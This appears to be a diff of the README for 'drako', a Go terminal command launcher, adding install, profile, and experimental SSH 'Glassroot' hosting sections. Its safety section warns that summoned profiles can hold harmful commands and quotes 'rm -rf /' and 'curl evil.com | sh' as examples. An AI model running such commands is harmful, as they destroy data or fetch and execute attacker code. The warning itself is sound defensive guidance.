@@ -1,8 +1,8 @@
+# drako
+\
 [![GitHub tag (latest by date)](https://img.shields.io/github/v/tag/lucky7xz/drako?color=007D9C&label=version)](https://github.com/lucky7xz/drako/tags)
 [![License](https://img.shields.io/github/license/lucky7xz/drako?color=orange)](https://github.com/lucky7xz/drako/blob/main/LICENSE)
 [![Go Version](https://img.shields.io/github/go-mod/go-version/lucky7xz/drako?color=00ADD8&logo=go&logoColor=white)](https://go.dev/)
-
-# drako
 
 `drako` represents an entirely new species of terminal tools: the customizable **Command-Deck Launcher**. It is not a menu, nor a shell history. It is a brutalist **architectural framework for any CLI-based workflow**, solidifying your scattered commands, TUIs, and scripts into a cohesive control surface. As such, CLI-driven workflows become remarkably easy to document, distribute, teach, and scale across a team.
 
@@ -17,23 +17,6 @@ https://github.com/user-attachments/assets/21fb2340-bc74-4886-a629-8e95d116e830
 -   **The Grid:** Your keyboard-based command center. It is technically `3-dimensional` and can fit up to 729 (9x * 9y * 9z) commands per `grid`, any of which can be accessed almost instantly using **Quick Navigation** (see below). Cycle through command grids or stash them in the `inventory` folder using `i`.
 -   **Profiles, Decks, & Assets:** A `profile` consists of a `grid configuration` (size etc), a collection of commands (the `deck`), and `assets` (optional). Example: A `profile` can have a `deck` of Docker commands, and have Docker compose files as its `assets`. 
 -   **Portable Specs:** All `profile` files exist in `~/.config/drako/`. You can download new `profile` setups from any `git` repository to your `inventory` folder using `drako summon`. You can even have multiple such `profiles` in a single repo (`specs`). Git-manage your own `spec` folder and `summon` your own control panel in an instant.
-
-### 🧭 Navigation
-
-- **Grid Navigation:** Use arrows, `w/a/s/d`, or `h/j/k/l` (customizable in config.toml).
-- **Quick Nativagion:** For example : Pressing `2` and `3` in quick sequence moves the cursor to the 2nd column, 3rd row.
-- **Switch Profile:** `Alt` + `1-9` to switch directly.
-- **Cycle Profile:** `o` (prev) and `p` (next).
-- **Profile Inventory:** `i`.
-- **Lock Current Profile (for launching):** `r`.
-- **Grid/Path Toggle:** `Tab`.
-- **Path Mode:**
-    - **Search:** `e` (type to filter, arrows to select, esc to cancel).
-    - **Hidden Files:** `.` to toggle.
-    - **Back:** `q` or `Esc`.
-- **Quit:** `Ctrl+C` (Global), or `q` (Grid Mode).
-
-> **Customization:** Remap keys in `~/.config/drako/config.toml` under `[keys]`.
 
 ## 🚀 Quick Start
 
@@ -60,8 +43,17 @@ If you are not getting the latest version, use this command instead:
 ```bash
 GOPROXY=direct go install github.com/lucky7xz/drako@latest  # update drako
 ```
-> [!NOTE] 
-> **New to Go?** Unlike apt or brew, Go installs tools into your home folder (`~/go/bin`) rather than the system root. You must add this directory to your shell's PATH to run `drako` directly. You can lauch drako with `~/go/bin/drako`. In the `Settings` Cell (`core profile`), you can find a command called `Add go/bin to PATH` that will write the necessary changes to your shell config file.
+
+### First run
+
+Installing with Go is currently the only method (a `curl | sh` script is on the roadmap). Go drops binaries in `~/go/bin`, which usually isn't on your `PATH` yet — so on first run, launch drako by its full path:
+
+```bash
+go install github.com/lucky7xz/drako@latest   # install
+~/go/bin/drako                                 # first run (PATH not set up yet)
+```
+
+Once it's open, the **Settings** cell in the Core profile has an **Add go/bin to PATH** command that writes the change to your shell config. Open a new shell afterward and you can just run `drako`.
 
 > [!NOTE]
 > **Emoji Support:** drako profiles sometimes use emojis as visual indicators. Modern terminals (Ghostty, WezTerm etc.) may support them by default. Others (older Linux terminals) may require installing a "Nerd Font" (e.g., [Nerd Fonts](https://www.nerdfonts.com/)) or specific emoji font packages (e.g., `fonts-noto-color-emoji`).
@@ -70,6 +62,52 @@ GOPROXY=direct go install github.com/lucky7xz/drako@latest  # update drako
 
 To enable `cd` on exit, see [docs/SHELL_INTEGRATION.md](docs/SHELL_INTEGRATION.md). 
 
+### 🧭 Navigation
+
+- **Grid Navigation:** Use arrows, `w/a/s/d`, or `h/j/k/l` (customizable in config.toml).
+- **Quick Navigation:** For example : Pressing `2` and `3` in quick sequence moves the cursor to the 2nd column, 3rd row.
+- **Switch Profile:** `Alt` + `1-9` to switch directly.
+- **Cycle Profile:** `o` (prev) and `p` (next).
+- **Profile Inventory:** `i`.
+- **Lock Current Profile (for launching):** `r`.
+- **Grid/Path Toggle:** `Tab`.
+- **Path Mode:**
+    - **Search:** `e` (type to filter, arrows to select, esc to cancel).
+    - **Hidden Files:** `.` to toggle.
+    - **Back:** `q` or `Esc`.
+- **Quit:** `Ctrl+C` (Global), or `q` (Grid Mode).
+- **Glassroot Mode (launch flag):** start with `drako --glassroot` for a sealed surface meant for SSH/Wish hosting (see Glassroot Mode below).
+
+> **Customization:** Remap keys in `~/.config/drako/config.toml` under `[keys]`.
+
+
+## 📇 Profile Creation Example
+
+Create a new file with the `.profile.toml` extension. `drako` will discover it automatically.
+
+ For example `~/.config/drako/networking.profile.toml`:
+
+```toml
+# Define grid size and theme for this profile.
+x = 3
+y = 4
+theme = "dracula"
+
+[[commands]]
+name = "nmap LAN"
+command = "nmap -sn 192.168.1.0/24"
+col = "a"
+row = 0
+auto_close_execution = false       # Here we want to keep the window open after execution to actually see the output.
+
+[[commands]]
+name = "Bandwidth"
+command = "bmon"
+col = a
+row = 1
+# auto-close true per default      # Here we want to close the window after execution because bmon is a TUI.
+
+```
 
 ## 👢 Bootstrap & 🧶 The Weaver
 
@@ -99,34 +137,6 @@ internal/config/bootstrap/
 
 **NOTE:** If your OS specific dictionary is missing, feel free to create a pull request!
 
-
-## 📇 Profile Creation Example
-
-Create a new file with the `.profile.toml` extension. `drako` will discover it automatically.
-
- For example `~/.config/drako/networking.profile.toml`:
-
-```toml
-# Define grid size and theme for this profile.
-x = 3
-y = 4
-theme = "dracula"
-
-[[commands]]
-name = "nmap LAN"
-command = "nmap -sn 192.168.1.0/24"
-col = a
-row = 0
-auto_close_execution = false       # Here we want to keep the window open after execution to actaully see the output.
-
-[[commands]]
-name = "Bandwidth"
-command = "bmon"
-col = a
-row = 1
-# auto-close true per default      # Here we want to close the window after execution because bmon is a TUI.
-
-```
 
 ## 🧰 Power Tools
 
@@ -171,6 +181,14 @@ drako strip
 
 ```
 
+## ⚠️ Safety First
+
+- **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
+    - **Review before running:** Always inspect the contents of a summoned profile (using `cat` or your editor) *before* you start using it.
+    - **Only summon from trusted sources:** Treat a profile URL like you would a binary executable.
+- **Understand the Commands:** Some entries perform system changes (e.g., package updates, Docker operations). Press `e` in the TUI to read the command description.
+- **When Unsure:** Consult documentation or ask a trusted friend/colleague.
+
 ## 🗑️ Purge
 
 Safely reset or remove configurations.
@@ -191,6 +209,7 @@ drako purge --config
 drako purge --destroyeverything
 ```
 
+
 ## 🚑 Rescue Mode
 
 If your configuration breaks (syntax error, invalid grid), Drako won't crash. It enters **Rescue Mode**.
@@ -199,13 +218,25 @@ If your configuration breaks (syntax error, invalid grid), Drako won't crash. It
 - **Manual Access:** You can enter `[ Rescue Mode ]` manually via the **Inventory** (`i`).
 - **Exit:** Select "Exit Rescue Mode" or switch to a working profile (`o`/`p`) to return to normal operation.
 
-## ⚠️ Safety First
 
-- **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
-    - **Review before running:** Always inspect the contents of a summoned profile (using `cat` or your editor) *before* you start using it.
-    - **Only summon from trusted sources:** Treat a profile URL like you would a binary executable.
-- **Understand the Commands:** Some entries perform system changes (e.g., package updates, Docker operations). Press `e` in the TUI to read the command description.
-- **When Unsure:** Consult documentation or ask a trusted friend/colleague.
+## 🧊 Glassroot Mode (experimental)
+
+`drako --glassroot` launches a sealed, locked-down surface meant for serving drako over SSH with [Wish](https://github.com/charmbracelet/wish). drako ships no SSH server of its own — you write the Wish app, and run drako in glassroot mode inside it.
+
+Over Wish the running program *is* the connection, so glassroot tucks away the local escape hatches that don't belong in a remote session:
+
+- **No Rescue Mode.** A broken profile/config ends the session quietly rather than dropping a guest into Rescue Mode (which would reveal host paths and TOML).
+- **No filesystem, inventory, or locking.** Path mode (`Tab`), Inventory (`i`), and Lock (`r`) are off.
+- **No clipboard.** Copy (`y`) is disabled.
+- A `🧊 G-ROOT` badge shows in the header.
+
+Glassroot locks the interface, but the commands still do whatever they do — so it's worth curating the deck before you open it up. A good pre-flight:
+
+- Equip just the profiles you'd like to share, and stash the rest.
+- Give each command a once-over, including the TUIs they open — a command that opens a shell or writes files quietly widens what a guest can touch, with security implications worth taking seriously. The more familiar you are with what you're sharing, the more secure the hosting.
+
+> Hosting drako over Wish is still experimental — feedback welcome.
+
 
 ## Roadmap 
 
@@ -213,15 +244,23 @@ If your configuration breaks (syntax error, invalid grid), Drako won't crash. It
  - [x] Summon profiles incl assets
  - [x] DRY Refactor  
  - [x] Grid Size Safety & Rescue Mode
- - [x] Core Profile Concept
- - [~] MacOS support (untested)
- - [~] Windows support (untested)
+ - [~] Glassroot Mode
+ - [ ] Weaver-enabled adaptive user profiles
+ - [ ] 
+
+ ## Dev
  - [~] Full unit test suite
- - [ ] Steamdeck support
- - [~] ARM Support
  - [ ] CI/CD
+ - [ ] Install 
  - [ ] Auto Update
 
+ ### Support
+ - [~] MacOS support (untested)
+ - [~] Windows support (untested)
+ - [~] ARM Support
+ - [ ] Mouse Support
+ - [ ] Steamdeck Support
+ - [ ] Touch Support
 ---
 
 ## 🤝 Contribution
